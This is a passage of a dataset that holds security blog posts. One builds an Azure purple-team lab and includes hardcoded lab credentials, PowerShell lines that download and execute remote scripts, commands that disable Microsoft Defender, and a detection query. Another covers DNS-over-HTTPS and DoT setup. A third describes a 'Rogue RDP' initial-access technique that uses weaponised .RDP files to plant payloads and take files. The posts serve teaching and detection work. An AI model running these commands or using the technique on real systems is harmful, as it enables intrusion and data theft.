https://www.fullcontact.com/\n\nSendgrid: https://sendgrid.com/\n\nCensys: https://censys.io/\n\nShodan: https://www.shodan.io/\n\nVirusTotal: https://www.virustotal.com/\n\nMailChimp: https://mailchimp.com/\n\nIPStack: https://ipstack.com/\n\nCloudflare Tunnel: https://www.cloudflare.com/products/tunnel/\n\nTenable Nessus: https://www.tenable.com/products/nessus\n\nSecurity Scorecard: https://securityscorecard.com/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Azure Sandbox  Purple Edition\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, General InfoSec Tips & Tricks, Hunt Teaming, Informational, Jordan Drysdale, Jordan Drysdale\"\nCreation Date: \"Tue, 08 Feb 2022 14:21:47 +0000\"\nJordan Drysdale //\n\nAzure has replaced AWS in my personal development pipeline. This may sound crazy but hear me out. Microsoft has solidified its offerings, done nothing but improve its security posture, and in my opinion, gone above and beyond to root out threats at its core. While AWS was the innovator and maintains that title in cloud space, they are experiencing what all early adopters go through in business. They are quickly learning that some of their offerings have legit competition on other platforms, both technically and financially. Azure\u2019s integration with a dashboard, logs query tool, easy to deploy endpoint protection solutions, full-stack security operations through Sentinel, and less expensive OS licensing, has created an alternative that I love.\n\nOpinions aside, the point of this article is to introduce some fundamental concepts of the Azure marketplace and its capabilities. We will also get to the purple team lifecycle of threat hunting that is so near and dear to my life\u2019s work. Without further ado, the topics:\n\nARM templates and deployments\n\nLog analytics\n\nMicrosoft Defender for Identity (was MDATP)\n\nMicrosoft Sentinel\n\nPurple teaming concepts\n\nAzure Sentinel was introduced as a threat hunting platform around this time last year. That work relied on the OTRF frameworks built by Roberto and Jose Luis Rodriguez. That blog is linked below.\n\nhttps://www.blackhillsinfosec.com/azure-sentinel-quick-deploy-with-cyb3rward0gs-sentinel-to-go-lets-catch-cobalt-strike/\n\nThat work relied on an Azure Resource Manager template (ARM) to deploy a domain, attack rig, and services in accordance with the ARM definitions. There is also some opportunity during deployment for customization. Simply stated: find a base template, customize it to your needs, click a button, rock and roll. The Azure team maintains a repo on GitHub with an ARM template starter for everyone\u2019s needs.\n\nLink: https://github.com/Azure/azure-quickstart-templates\n\nClicking through the active-directory quick-start directory lands at the following page where we can finally \u201cclick to deploy.\u201d\n\nThat is Azure Resource Manager. Easy, customizable, extensible, and infinitely capable of meeting even the most complex needs. Now, as a consummate purple teamer, my needs are simple. All I need to perform a lifecycle is a domain, joined workstation, attack rig, and somewhere to search logs. The button shown in the next screenshot does it all (www.doazlab.com and https://github.com/DefensiveOrigins/DO-LAB). Also, no Azure account? Claim your free credits: https://azure.microsoft.com/en-us/free/.\n\nThe process is straightforward, click to deploy. Create a new Resource group or choose an existing and change the location.\n\nThe next screen asks what size of VM you would like. There are three in total \u2014 one DC, one WS, one Linux.\n\nFinally, the template asks if you would like to restrict the two RDP listeners and SSH to a trusted netblock. I generally leave mine configured as all zeroes for threat research purposes.\n\nThe credentials are hardcoded in this version. You may want to use this build as a template; I would advise changing these credentials to either prompt during the build process or change them in your ARM template.\n\nDomain: doazlab.com\nUsername: doadmin\nPassword: DOLabAdmin1!\n\nThe last page confirms your configuration and forces you to accept the terms and conditions. In about 45 minutes, we can start threat hunting!\n\n\u2026\n\nNavigate to portal.azure.com and find your Log Analytics workspace. Click on the Virtual machines button.\n\nThe VMs will need to be connected to Log Analytics for logs to start flowing. The VMs deploy without a full connection and need an additional \u201cclick\u201d and \u201cconnect\u201d for full logging capability.\n\nOnce all of the virtual machines are connected to the Log Analytics workspace, navigate back over to portal.azure.com (Home) and search for Sentinel.\n\nConfirm that you have logs flowing.\n\nNext, you will need to gather the public IP address assignments for your virtual lab environment. Based on feedback, there is an RDP listener for each of the Windows VMs and an SSH listener for the Linux system.\n\nRemember your credentials!\n\nFor the RDP connections, use doazlab\\doadmin:DOLabAdmin1!\n\nFor SSH, use doadmin:DOLabAdmin1!\n\nOnce you get RDP\u2019d over to the DC, run BadBlood to make some noise in AD. The following commands will accomplish that.\n\n$ProgressPreference = 'SilentlyContinue' \ninvoke-webrequest -URI \nhttps://github.com/Relkci/BadBlood/archive/refs/heads/master.zip -outfile \nbadblood.zip \nExpand-Archive .\\badblood.zip \n$ProgressPreference = 'Continue' \n./badblood/BadBlood-master/invoke-badblood.ps1\n\nDo not run this in production. You will have an absolute disaster on your hands. Do not run this in production.\n\nWhen completed, you have a legacy AD environment that looks like some of the domains seen in the wild.\n\nLet\u2019s make some PowerShell noise from the workstation to see how our log query capabilities can respond to invocation. The next commands invoke PowerUp\u2019s AllChecks.\n\nSet-ExecutionPolicy bypass -force\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')\ninvoke-allchecks\n\nThe next commands should quiet Microsoft Defender if you have issues. You may need to tune the command if you made any changes in the ARM template earlier.\n\nSet-MpPreference -ExclusionPath 'c:\\users\\doadmin'\nSet-MpPreference -ExclusionProcess \"powershell.exe\", \"cmd.exe\"\nSet-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend\n\nLast up for now, let\u2019s run HostRecon.\n\nSet-ExecutionPolicy bypass -Force\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1')\nInvoke-HostRecon |Out-File recon.txt\n\nThis should have created some noise in our LA dashboard which will allow us to formulate a plan for catching this activity in the future, and even better to create an alarm condition.\n\nAccess the Sentinel dashboard and click on Logs. Find the query field and enter the following KQL query.\n\nunion Event, SecurityEvent \n| where EventID in (4103, 4104, 4105, 4688) \n| where EventData contains \"iex\" or EventData contains \"invoke\" or EventData contains \"import\" or EventData contains \"bypass\" or EventData contains \"git*\" \n| project Computer , RenderedDescription , ParameterXml \n\nWhat is going on here? What is KQL? I thought KQL was Kibana query language!?\n\nThe query we formulated looks for PowerShell-related log events; see the \u2018where EventID\u2019 clause. We then string search against the \u2018EventData\u2019 results from those specific IDs. Finally, we are only interested in a few columns \u2013 you can remove the bottom line starting with \u2018| project\u2019 or add \u2018//\u2019 in front of it to comment that line and see the entire result set. This would allow you to then formulate your own columns of interest using the \u2018project\u2019 operator.\n\nKQL is awesome and the DBAs among you will appreciate it and pick it up without concern. If it walks like SQL and talks like SQL, it\u2019s a lot like SQL.\n\nAnd no, Kusto Query Language is the language of Microsoft Sentinel. And, we have some interesting results below.\n\nSo, we may want to save this query for later, which is ridiculously easy. See the Save button there? Use it. I save all the queries that return data of interest with a unique identifier. As shown next, I like the word sketchy. It simplifies my future searches for the queries I have found useful.\n\nYou can also create Alerts with relative ease. At this point, I would be surprised if you were not excited about all the capabilities of the Azure cloud.\n\nLet\u2019s tie this all together with some purple teaming methodology. We had a goal to improve our internal operations and security posture. We did that with a quick threat analysis using Sentinel and a couple of cloud VMs. A side note here: the Log Analytics agent can be installed on your on-premises servers too.\n\nRisk Assessment: Ongoing risks presented by PowerShell tools and an upcoming pentest\n\nThe Plan: Improve our PowerShell detection capabilities\n\nAttack: Spin up a sandbox on Azure and run some sketchy PowerShell commands\n\nHunt / Defend: Learn how to query and create alerts in Azure Sentinel\n\nHarden / Adjust: Future! Create playbooks in Azure to respond to these alerts accordingly (there is so much capability here \u2013 maybe the next blog)\n\nReport: Demonstrate this to our CISO/CTO - see our reporting template: https://github.com/DefensiveOrigins/AtomicPurpleTeam/blob/master/Playbook/PB0170.pdf\n\nThanks for reading and please come join us for training, webcasts, pentests, and all of your infosec needs.\n\nhttps://www.doazlab.com\n\nhttps://github.com/DefensiveOrigins/DO-LAB\n\nhttps://azure.microsoft.com/en-us/free/\n\nhttps://docs.microsoft.com/en-us/azure/azure-resource-manager/templates/overview\n\nhttps://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/\n\nhttps://github.com/DefensiveOrigins/AtomicPurpleTeam\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The DNS over HTTPS (DoH) Mess\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 301, Joff Thyer, DNS Security, Joff Thyer\"\nCreation Date: \"Tue, 15 Feb 2022 19:36:20 +0000\"\nJoff Thyer //\n\nI woke up this Monday morning thinking that it's about time I spent time looking at my Domain Name Service (DNS) configuration in my network. (This thought also emanated from watching many discussions and participating in conversations with Paul Vixie at Wild West Hackin\u2019 Fest in Reno, Nevada 2021.)\n\nTo put this in context, I have never been a person that assumes my local Internet Service Provider (ISP) DNS infrastructure is something I should rely upon. No offense intended, but I have always assumed that ISP infrastructure is held together by duct tape and bailing wire, and I have always been a \u201cdo it yourself\u201d sort of person.\n\nAnother way to say this is, \u201cHey guys, just give me a fiber optic to Ethernet handoff, route my static addresses to me, pass my packets, and the rest is on me.\u201d I have had the amazing luck of finding an ISP that does exactly that, and even went as far to say they would pass me a Border Gateway Protocol (BGP) table if I owned the address block. Wow, music to my ears!\n\nIt should come as no surprise that I have, in the past, managed massive networks myself with thousands of endpoints and that my home network is a tight ship. You bet that I roll my own routing, network address translation, dynamic host configuration protocol (DHCP), and DNS services. My network is rock-solid reliable \u2014 if my upstream passes those packets, of course!\n\nAnd now, for the uncomfortable discussion. We live in the age of surveillance capitalism today, and as a world Internet community, we have literally let various companies get away with murder by mining the data exhaust that we continuously produce.\n\nDNS is foundational to the Internet. Its very design is highly distributed, by definition! It is 100% acceptable and encouraged to run your own DNS server in your own network and instruct DHCP to tell your network endpoints that your own DNS is the right and true place to translate domain names to IP addresses. Unfortunately, when it comes to home networks, most people don\u2019t have the skills to do it themselves and rely on small office/home office (SOHO) router vendor products, many of which are cheaply engineered and highly vulnerable; alas, that topic is for another day.\n\nWhen DNS meets surveillance capitalism, bad things happen. When any plaintext protocol is readable over the network, and is mined for monetary reward, your privacy is being violated and you are becoming the source of a vast amount of revenue.\n\nThere is a tiny saving grace if you run your own DNS server, and that is the idea of caching. Any DNS request that your local DNS server makes upon a client stub resolver\u2019s (endpoint) behalf will have a cache value known as a Time to Live (TTL), which your DNS server must honor. Your DNS server \u201cremembers\u201d the answer to a request for a TTL number of seconds.\n\nIf you run your own DNS server and you DO NOT forward all requests to another DNS provider (such as 8.8.8.8), your DNS server must ask the root name servers to aid in resolving a request. The diagram below shows essentially how your local DNS server behaves when looking up www.whitehouse.gov for example.\n\nThe DNS server actions when looking up the www.whitehouse.gov DNS A record\n\nWhat\u2019s the problem? As security professionals, we love good encryption and, let\u2019s face it, DNS is not too pleasing because it\u2019s not encrypted. \n\nWhat about DNSSEC? Sorry, DNSSEC cannot help us because its goal is to ensure the accuracy of the answer / prevent spoofing, which in turn helps address the cache poisoning issue, but DNSSEC does not protect data in transit.\n\nWell, it turns out that the various browser vendors came up with one of the worst ideas ever. That idea was to transmit DNS requests over HTTPS. https://datatracker.ietf.org/doc/html/rfc8484\n\nNow, you may be having an adverse reaction right about now. I mean, HTTPS is encrypted, right? Yes, true, it is encrypted, but remember the surveillance capitalism comment above?\n\nThink about this\u2026 if your DNS traffic is sent to the browser vendor infrastructure, your data is even more subject to surveillance. In fact, what has happened is a consolidation of significant control and power over your data! Furthermore, by doing this, the extreme operational stability of a highly distributed architecture has suddenly become centralized in the hands of a few. All the precepts of an open standard and free Internet are being subverted by the data-mining few.\n\nWe are additionally crossing the streams here from a protocol perspective. HTTP = \u201cHypertext Transfer Protocol\u201d and DNS is NOT hypertext!  As a result, we have a situation of vertical protocol stack single browser vendor lock in that has developed.  Is this what we want? Is this the right solution?\n\nI find myself extremely conflicted at this point in the article. I mean, is it not true that solid encryption is a good thing? As security professionals, we stand behind well-tested, researched, strong encryption, but I personally cannot stand behind this whilst my privacy is being so thoroughly violated.\n\nI am further conflicted in that I have no real assurance that my local ISP is not mining my encrypted data either. Where do we turn from here?\n\nThere is another form of DNS encryption that has existed for a while known as DNS over Transport Layer Security (DoT). https://datatracker.ietf.org/doc/html/rfc7858\n\nWithout diving into too deep a hole, in short, DoT at least tries to do the right thing by having an appropriate listening TCP service on TCP port 853 and using Transport Layer Security (TLS) as it\u2019s intended in an appropriate open standard protocol compliant fashion. The challenge is just that DoT is indeed a new protocol, and how can we / do we instruct our client endpoint stub resolvers to properly use this protocol? Sure, we can turn back to our good old friend DHCP and have some sort of option; then, we must hope that all the operating system vendors do the right thing with the DNS stub resolver code implementing TLS support as needed.\n\nWell, not surprisingly, the \u201cright solution\u201d does not always win in favor of the \u201ceasy solution.\u201d DoT would require a lot of change, and people don\u2019t like change, especially with something with an expectation level as ubiquitous as electricity.\n\n(The Simpsons is property of Disney)\n\nBut wait just a minute \u2014 I am not being entirely fair on the topic of data surveillance.\n\nBelow is a sample list of DNS over HTTPS providers by domain name (ironic, huh?). Many of these purport value-added service through operational resiliency, and filtering malware/spyware domains/advertisements.\n\ncloudflare-dns.com, and one.one.one.one\n\nPrivacy policy statement here at https://blog.cloudflare.com/announcing-the-results-of-the-1-1-1-1-public-dns-resolver-privacy-examination/.\n\ndns.adguard.com\n\nhttps://kb.adguard.com/en/dns/overview\n\ndns.google, and dns.google.com\n\nmines data as revenue source\n\ndns.nextdns.io\n\nPrivacy Policy - NextDNS\n\ndns.opendns.com, and doh.umbrella.com (Cisco business service)\n\nhttps://www.opendns.com/website-terms-of-use/\n\ndns.quad9.net\n\nhttps://www.quad9.net/service/privacy/\n\nAlright, well, having gone through this list, it\u2019s a fair statement to say that most of the above have a reasonably strong statement about your privacy (with one notable exception).\n\nThus, my strongest objections come down to the violation of the protocol stack, and individual browsers assuming the function of the client stub resolver process regardless of your local network configuration. This is far from acceptable in large enterprise network operations who absolutely need to exercise security control over their network protocols.\n\nAs it happens, many of the above DoH providers also support DoT. So, coming full circle back to my Monday morning goal of reexamining DNS in my network, I took a moment to focus and think about my level of comfort. It came down to this:\n\nI absolutely 100% believe that anyone who can, should run their own internal DNS server.\n\nI like to continue being able to diagnose and see what DNS traffic is occurring inside my own network.\n\nRunning my own internal DNS server gives me the ability to configure and run my own domain filtering services which I have had in place for a number of years. If you don\u2019t roll your own like me, consider the Pi-Hole project. https://github.com/pi-hole\n\nI am not comfortable with the idea that ISPs are seeing surveillance capitalism as a revenue source, and thus are likely examining my DNS traffic.\n\nI am conflicted about destroying the distributed stable beauty of DNS in its original form, but strong encryption is never a bad idea.\n\nI settled on the idea that I will continue to run my own DNS server but will encrypt the traffic coming from that server to Quad9 using DoT. Upon reading, it feels as if Quad9 has the best interest and best intent of providers out there. In conjunction with this, I will actively block DoH to any of these public providers through an iptables rule updated with a dynamic IP set that I can change as needed. Yes, this means directly blocking TCP port 443 destined traffic to a set of specific IP addresses because someone thought it was a good idea to conflate protocols (sigh). I can maintain the domain list and update sporadically as needed.\n\nStubby\n\nSince my perimeter firewall is an Ubuntu-based device, I needed to find software that can listen to the DNS request, and then formulate it as a DNS over TLS (DoT) transaction to Quad9. I suspect there might be a number of choices available, however I chose to use the DNS privacy daemon aptly named \u201cStubby\u201d (https://dnsprivacy.org/dns_privacy_daemon_-_stubby/). Installation was as simple as \u201csudo apt install stubby\u201d.\n\nStubby acts as a local DNS privacy stub resolver, sending DNS queries over an encrypted TLS connection using DoT. Stubby is configured via a Yaml file named /etc/stubby/stubby.yml, and as you might expect, Quad9 publishes a configuration for you. Refer to https://support.quad9.net/hc/en-us/articles/4409217364237-DNS-over-TLS-Ubuntu-18-04-20-04-Stubby- for more information.\n\nStubby Configuration File /etc/stubby/stubby.yml\n\nIf you desire to look up all the various settings, you can find them here at https://getdnsapi.net/documentation/manpages/stubby/.  A few highlights for you, as follows:\n\n\u201ctls_authentication: GETDNS_AUTHENTICATION_REQUIRED\u201d means that TLS must be used and there is no fallback.\n\n\u201ctls_query_padding_blocksize: 128\u201d will use the EDNS0 option with padding to this number to hide the actual query size.\n\n\u201cedns_client_subnet_private: 1\u201d (true) will prevent any client side subnet information from being sent to the authoritative server.\n\n\u201cround_robin_upstreams: 1\u201d (true) will send the upstream queries to all the specified servers in a round-robin fashion.\n\n\u201cidle_timeout: 10000\u201d (specified in milliseconds) keeps the TCP connections open for that period of time to lower connection overhead. Can be overridden by the server end of the connection.\n\n\u201clisten_addresses\u201d is your local end listening address. For my own internal DNS server, it makes sense to set this to 127.0.0.1 on port 8053 so I can then configure bind9 to use this.\n\nBind Configuration\n\nThe next step is to change the bind configuration so that it \u201cforwards\u201d DNS requests to the local Stubby instance, rather than using other DNS name servers to populate its cache. You have two options here, either forward all requests, or forward requests unless the forwarder fails, then fallback to normal DNS protocol operations. In terms of bind configuration syntax, this amounts to using the directive \u201cforward only\u201d versus \u201cforward first\u201d whereby the latter will fallback upon failure. You are also required to configure the address you are forwarding to. The screenshot below shows my configuration which is placed in the /etc/bind/named.conf file within the options section.\n\nBind Forward First Configuration\n\nFinal steps are to ensure that Stubby is running, and also to ensure that Stubby is configured to start automatically in system services using the command \u2018systemctl enable stubby\u2019 as root.\n\nStubby Status Shows Running and Enabled\n\nThen finally, you can reload your bind name server using \u2018rndc reload\u2019 and you will now be encrypting your Internet-bound DNS traffic to Quad9.\n\nFirewall Configuration\n\nIn my specific case, I use iptables to enforce my perimeter firewall rules and thus, after I managed to get the DNS configuration updated, I did need to change some things as follows:\n\nAllow outbound TCP port 853 traffic to the Quad9 addresses.\n\nConfigure an IP set with common DoH providers, and then block traffic to them.\n\nBlock any unauthorized DNS from going direct to servers without using internal DNS server.\n\nOne possible method I use to create the IP set for the DoH provider list is to list out the providers by domain name as above, and then perform DNS lookups on each on a daily basis to ensure that if the providers are using anycast addresses, the blocking list always has a current set of addresses. Using a simple shell script and the \u201cipset\u201d command provides an easy method to do this.\n\nShell Script to Create/Maintain the IPSET named \u201cdoh\u201d\n\nAfter you have this configuration in place, you can easily create a crontab entry to continuously maintain the list on a periodic basis.\n\nMaking the assumption that your firewall is the perimeter device and that you are performing NAT and IP traffic forwarding, you would need some sort of iptables rule to prevent forwarding any traffic to the DoH provider list. In my configuration, this rule looks as follows:\n\nIP-Tables Rule to Block Forwarding of DoH Traffic\n\nYou will also need to ensure that Stubby can communicate outbound from your firewall for its DNS over TLS traffic to be able to resolve domains against the Quad9 servers.\n\nOutbound Firewall Rules Allowing DoT Traffic\n\nThe final pi\u00e8ce de r\u00e9sistance is to ensure that any endpoints inside of your network cannot completely bypass your internal DNS server and send traffic to any DNS provider on the Internet. It may not surprise you that many devices produced by Google just love to come preconfigured with 8.8.8.8 as their DNS resolver. That shall not happen on my network!\n\nIf, for example, your internal network ranges are in the 10.0.0.0/8 class A somewhere, a pair of rules similar to the below screenshot will happily accomplish this.\n\nRules to Block Unauthorized DNS Traffic\n\nAnd there we have it! I have achieved temporary piece of mind by encrypting Internet-destined DNS traffic, at least across to Quad9, while keeping my own ability to monitor normal DNS traffic inside my network. I feel this is a fair balance of encryption, privacy, security, and operational availability.\n\nHappy trails in your own quest to surviving the mess that is DNS over HTTPS!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Rogue RDP  Revisiting Initial Access Methods\"\nTaxonomies: \"Author, C2, General InfoSec Tips & Tricks, Mike Felch, Red Team, initial access, RDP, remote desktop\"\nCreation Date: \"Mon, 28 Feb 2022 16:25:42 +0000\"\nMike Felch //\n\nThe Hunt for Initial Access\n\nWith the default disablement of VBA macros originating from the internet, Microsoft may be pitching a curveball to threat actors and red teams that will inevitably make initial access a bit more difficult to achieve. Over the last year, I have invested some research time in pursuing the use of the Remote Desktop Protocol as an alternative initial access vector, which this post will cover.\n\nIn efforts to regain traction, I want to introduce a new technique I dubbed as Rogue RDP. It\u2019s the ability to leverage a malicious RDP server, an RDP relay, and a weaponized .RDP connection file which forces unsuspecting victims into connecting and forwarding control over some parts of their machine. With the right ruse, an established connection will provide an attacker the necessary means to access files, plant binaries for execution, and under the right conditions \u2013 execute remote code.\n\nSo, to begin my journey, I wanted to quickly identify the default extensions registered within Windows and their corresponding programs that would launch when executed. To do this, I generated a grid of extensions, file types, and their executable using PowerShell with the ftype and assoc built-in commands. Additionally, I also generated a file with each of the extensions so I could rapidly test default execution behavior by clicking on the files.\n\nView Extensions and Executables in Grid\n\nC:\\> $fm = @{}; cmd /c ftype | foreach { $ft, $ex = $_ -split '='; $fm.add($ft,$ex); }\n\nC:\\> cmd /c assoc | foreach { $e, $f = $_ -split '='; [pscustomobject]@{Extension = $e; FileType = $f; Executable = $fm[$f]; } } | out-gridview\n\nGenerate Files from Extensions\n\nC:\\> cmd /c assoc | foreach { $e, $f = $_ -split '='; \"hax\" > \"hax$e\"; }\n\nAs seen in the above screenshot, after randomly clicking files and investigating the launched program, one extension continually jumped out at me\u2026 RDP! The beauty (or danger) with .RDP files is security providers, email gateways, and email clients all permit .RDP files to be sent and received by default. Whether they are downloaded from a web browser, shared via network file shares, or simply sent through email \u2014 they will arrive at their target unscathed.\n\nAt the time of this post, all the default blocked attachment lists for Microsoft Outlook, Office365, and Proofpoint allow .RDP files.\n\nMicrosoft Outlook: https://support.microsoft.com/en-us/office/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519\n\nMicrosoft Online Services: https://techcommunity.microsoft.com/t5/exchange-team-blog/changes-to-file-types-blocked-in-outlook-on-the-web/ba-p/874451\n\nProofpoint: https://help.proofpoint.com/Proofpoint_Essentials/Email_Security/Administrator_Topics/090_filtersandsenderlists/Attachment_Types_Proofpoint_Essentials_Blocks_By_Default\n\nWeaponizing .RDP Files\n\nNext, I needed to determine what I could leverage within an .RDP file for initial access. Since the standard executable is Microsoft Terminal Services Client (MSTSC), this was a suitable place to start! An .RDP file contains the configuration settings for Remote Desktop connections, and since most corporate environments utilize RDP for shared computer resources among employees, Microsoft added numerous features to enable file and printer sharing, accessing clipboard contents, audio and video capture devices, smart cards, and even plug-and-play devices.\n\nHaving used RDP heavily over the past 18 years, my initial thought was to focus on the ability to force unsuspecting victims to map their local file system and clipboard to a rogue RDP server that I controlled. In this way, I could execute malicious programs (on my server) which would interact with the victim (their MSTSC client) file system. This proved to be successful because Microsoft provides a nifty way for code running within a Terminal Server environment to interact with Terminal Server Clients using Device Redirection. This capability is how accessing resources such as local drives and printers through Remote Desktop occurs. Servers can enumerate the mapped file system of a connected client by using folder paths such as \\\\tsclient\\c\\ for the C drive or even mounted Network File Shares using \\\\tsclient\\\\.\n\nSo, let\u2019s say a client\u2019s computer has the following mounted paths:\n\nLocal Disk (C:)\n\nUSB Drive (D:)\n\nNetwork File Share (S:)\n\nThey could be accessed by:\n\nLocal Disk: \\\\tsclient\\c\\\n\nUSB Drive: \\\\tsclient\\d\\\n\nNetwork File Share: \\\\tsclient\\s\\\n\nBring-Your-Own-Servers (BYOS)\n\nTo interact with a client, we are going to need some internet-facing infrastructure. It does not have to be sophisticated but the .RDP file will need to connect to a server that we control, so that we can interact with the client. Most Windows Servers that have RDP enabled on the internet will not last long before being inundated by threat actors trying to brute force access. To curb this behavior, I suggest modifying the RDP port to something higher and random. Additionally, temporarily disable access to RDP by firewalling your own IP address for testing. We will tighten down more exposure later in the post but for now, you just need:\n\nA standard Windows Server\n\nEnable remote desktop\n\nAdd a new user with RDP permissions\n\nWith PowerShell, you can modify the RDP listening port using:\n\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 21390\n\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21390\n\nIf we stop here, there are several issues that become obvious to our unsuspecting targets. First, with initial access we always want to reduce the number of interactions we require our victims to make. That is difficult because for their client to automatically connect to our server, we have to pre-load credentials in the .RDP file we send them, which is not possible nowadays because of Data Protection API (DPAPI). We could use a blank account password but that also requires weird interactions, not to mention it exposes our server to anyone who can guess the username. Because our RDP server identity is currently unverified and unknown, the publisher looks super sketchy with the big yellow warning banner. Finally, what happens if the network of the target has blocked the outbound port 3389? While we have numerous hurdles to overcome, we will attempt to solve all these problems!\n\nWhen thinking through ways to resolve some of these difficulties, I began considering the idea of writing some sort of RDP proxy. After digging into the RDP protocols and quickly realizing that the complexity of the numerous layers would end up being too much effort for the time being, I started looking for open-source projects that might have already implemented some of the communications and authentication channels. My hope was to set up some sort of listener that could forward the traffic to my server then have the victim clients connect to my proxy. This would eliminate having credentials floating around and give me the ability to auto-authenticate victims that connect. Additionally, it adds an extra layer of firewall protection so that only the proxy would be able to connect to the real RDP server.\n\nIt turns out, there is an amazing open-source project called pyrdp that implemented most of the protocols already! It acts as a MiTM (man-in-the-middle) proxy and not only will allow you to auto-authenticate but can also set up the listener on any port and even record live RDP connections. It has a bunch of built-in features, like automatically exfiltrating files that match signatures, running commands or PowerShell scripts on the real server (not the client machine), monitoring the clipboard, and even cloning certificates.\n\nReference: https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera\n\nI will spare you the implementation details, but if you look at the above image, you will notice numerous protocols, authentication layers, and device redirections that had to be implemented. The protocols include 128-bit encryption via RC4 algorithm, crazy bitmap bindings for the GUI, virtual channels for interacting with the Operating System (disk/printer/clipboard/etc.), plus a range of other specifications for authentication, encoding, and communication.\n\nWhat this does for us is provide the ability to pre-load our .RDP file configuration with any username, our proxy hostname, our proxy listening port (to avoid potential firewalls), and enable forwarding all drives, printers, and devices. Once we have the .RDP file generated, we can use LetsEncrypt to generate an SSL certificate for whatever domain we want to use on our proxy server then use OpenSSL to convert the certificate into a PFX file. On a Windows machine, you can import the PFX into the certificate store and sign the .RDP file using a built-in Windows utility called rdpsign.exe. There is likely an easier way to do all of this. By signing the .RDP file with your LetsEncrypt certificate, we now have a safer-looking connection dialogue!\n\nRDP Attacks\n\nWith our pyrdp proxy running and pointed at our real Windows server, all we need is some code that we execute once the sign-on session is established. The client will be connecting to our proxy via MSTSC, our proxy will automatically authenticate to our server, and bi-directional communication will occur between our victim\u2019s client and our server. This means the clients' drives will be accessible by both our proxy and our server.\n\nBinary Planting & Data Exfil\n\nMy favorite .RDP attack is enumerating mapped drives then identifying writable start-up locations so I can plant malicious payloads. Because the code is being ran on my server, EDR is mostly useless at preventing and responding, unless it detects the file-write activity or a later execution. Here are a few things to consider:\n\nIf you plant an LNK on the user\u2019s desktop, the keyboard shortcut will not trigger execution until the client computer restarts\n\nPlant a binary in common auto-run locations\n\nPlant a DLL for sideloading (i.e., dbghelp.dll for Microsoft Teams)\n\nPlant a .NET config/binary for AppDomainManager injection\n\nYou can also search for sensitive data/files. Depending on who I target, I like to look for things like AWS/Azure credentials and PowerShell history files.\n\nRemote Code Execution\n\nIf the client has Hyper-V enabled and a writable file share, there is a chance you can immediately execute code, although I have not found this to be a real-world red team experience. A researcher named Abdelhamid Naceri introduced a method of writing a payload to C:\\Program Files\\Hyper-V\\wfs.exe using an NTFS symbolic link, then triggering the Microsoft Windows Fax and Scan execution using printer redirection via the client printer name due to control code dispatching.\n\nAdvanced RDP Tactics\n\nOne cool technique is the ability to monitor and/or plant clipboard contents. When I was working through some testing, I was executing the .RDP file from within a Windows virtual machine but capturing the clipboard contents of the host computer. This was because I had my host clipboard mapped to my virtual machine, and when the virtual machine connected to my rogue RDP server, it was setting up a clipboard redirector. Additionally, because I had sharing enabled within my virtual machine, one of my host folders was accessible from the RDP server as well.\n\nFinal Thoughts\n\nWhile I have automated most of the heavy lifting for deploying pyrdp and generating/signing RDP files, I am going to hold off on releasing the tool, RogueRDP , for the time being. There only seem to be a handful of remediations currently worth mentioning. For those interested in implementing some of the server-side code, I would encourage you to check out the Cassia C# library.\n\nBlock .RDP extensions for email\n\nProperly configure the GPO to prevent redirection\n\nGroup Policy Settings\n\nComputer Configuration\\    Administrative Templates\\        Windows Components\\            Remote Desktop Services\\                Remote Desktop Session Host\n\nAlso, consider the methods in which an .RDP file can be delivered. I commonly use email, but common chat programs and even calendar injections work well too. In some cases, social networks also permit .RDP files. Given the circumstances, this is an excellent attack vector that, unless remediated by Microsoft, will prove to be fruitful for years to come.\n\nI intentionally left some of the implementation details a little vague in this post until we get some traction from vendors to reduce the attack surface, as well as corporations' opportunity to restrict their Terminal Service configurations. Additionally, it leaves opportunity for those interested readers to decide how they want to implement their Windows Server, server-side code, and RDP relay without handing threat actors the keys. An example of this is, I tend to set up my relay to listen on a common port in case my target's network blocks the outbound port 3389 and then exfil interesting files using pyrdp instead of running enumeration code from my malicious Windows Server.\n\nFor more information on the Rogue RDP technique, keep an eye out for my Wild West Hacking Fest presentation called \u201cSocially Acceptable Ways to Walk in the Front Door\u201d that Steve Borosh (@rvrsh3ll) and I gave last year at Deadwood 2021. I look forward to other researchers investigating ways to execute remote code and even other ways of establishing RDP sessions (*cough* I am looking at you RDP COM objects *cough*).\n\n"
    },
    {
        "input": "",
        "instruction": "",
